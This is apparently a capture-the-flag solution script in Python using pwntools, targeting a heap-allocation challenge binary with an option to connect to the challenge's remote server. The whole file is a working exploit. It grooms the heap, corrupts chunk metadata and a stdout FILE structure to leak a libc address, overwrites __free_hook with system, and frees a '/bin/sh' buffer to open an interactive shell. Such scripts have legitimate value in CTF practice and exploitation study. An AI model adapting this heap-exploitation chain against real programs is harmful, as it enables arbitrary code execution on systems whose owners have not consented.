from pwn import *

e = ELF("./alloc")
libc = ELF("./libc.so.6")



def exploit():
  if "--remote" in sys.argv:
    p = remote("ast-alloc.chal.ctf.westerns.tokyo", 10001)
  else:
    p = process(e.path)

  def alloc(size, t=1, data="AAAA", recvall=True):
    p.sendline(str(t))
    p.sendlineafter(":", str(size))
    if size != 0: p.sendafter(": ", data)
    if recvall: p.recvuntil("choice:")

  def free(t=1, recvall=True):
    p.sendline("4")
    p.sendlineafter(":", ["", "m", "c", "r"][t])
    if recvall: p.recvuntil("choice:")
  
  p.recvuntil("choice:")


  alloc(0x400, 3)
  free(3)
  alloc(0x390, 3)
  free(3)
  gdb.attach(p)

  alloc(0x50, 3)
  alloc(0x30, 3)
  alloc(0, 3)

  alloc(0x60, 3)
  alloc(0x500, 3)
  alloc(0x30, 3)
  free(3)

  alloc(0x600, 3)
  alloc(0x500, 3)
  alloc(0, 3)

  alloc(0x500, 2)

  alloc(0x390, 3)
  alloc(0, 3)

  free(2)
  alloc(0x30, 3)
  alloc(0x18, 3)
  alloc(0, 3)

  alloc(0x400, 3, "\x00" * 0x18 +(p64(0x21) + "\x00" * 0x18) * 2 + p64(0x341) + "\x00" * 0x338 + p64(0x511) + "\x50\x77")
  alloc(0, 3)
  alloc(0x30, 3)

  alloc(0x31, 1, "/bin/sh".ljust(0x10, "\x00") + p64(0xfbad1800) + p64(0) * 3 + "\x00", False)

  p.recv(8)
  leak = u64(p.recv(8)) - 0x1555553288b0 + 0x0000155554f3b000
  print("Libc Base: {:#x}".format(leak))
  p.recvuntil("choice:")
  
  if not "{:#x}".format(leak).startswith("0x7f"):
    raise Exception("Failed to leak")

  alloc(0x300, 3)
  free(3)
  alloc(0, 3)

  alloc(0x400, 3, "\x00" * 0x18 + p64(0x20) + "\x00" * 0x18 + p64(0x341) + "\x00" * 0x338 + p64(0x311) + p64(leak + libc.symbols["__free_hook"]))
  alloc(0, 3)
  alloc(0x300, 3)

  alloc(0x100, 3)
  alloc(0, 3)
  alloc(0x300, 3, p64(leak + libc.symbols["system"]))

  free(1, False)

  p.interactive()


def wrapper():
  exploit()

wrapper()
